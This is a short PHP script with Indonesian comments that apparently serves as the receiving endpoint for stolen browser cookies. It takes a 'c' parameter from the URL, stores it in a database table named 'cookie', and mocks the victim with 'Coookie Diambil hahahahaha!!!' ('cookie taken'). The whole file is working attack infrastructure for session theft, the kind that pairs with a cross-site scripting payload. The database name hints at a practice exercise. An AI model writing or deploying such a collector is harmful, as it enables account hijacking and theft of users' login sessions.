<?php
// echo "Test Opened";

// Ambil data dari GET dengan validasi
$gettingapps = isset($_GET["c"]) ? trim($_GET["c"]) : '';

// Hindari karakter berbahaya
$gettingapps = filter_var($gettingapps, FILTER_SANITIZE_STRING);

// Konfigurasi database (ubah sesuai dengan database Anda)
$host = "localhost";
$user = "root"; // Ganti dengan username database
$pass = ""; // Ganti dengan password database
$dbname = "pre-test"; // Ganti dengan nama database

// Koneksi ke database
$conn = new mysqli($host, $user, $pass, $dbname);

// Cek koneksi
if ($conn->connect_error) {
    die("Koneksi gagal: " . $conn->connect_error);
}

// Gunakan Prepared Statement untuk mencegah SQL Injection
$sql = "INSERT INTO cookie (get_text) VALUES (?)";
$stmt = $conn->prepare($sql);
$stmt->bind_param("s", $gettingapps);

// Eksekusi Query
if ($stmt->execute()) {
    echo "Coookie Diambil hahahahaha!!! :)";
} else {
    echo "Error: " . $stmt->error;
}

// Tutup koneksi
$stmt->close();
$conn->close();
?>
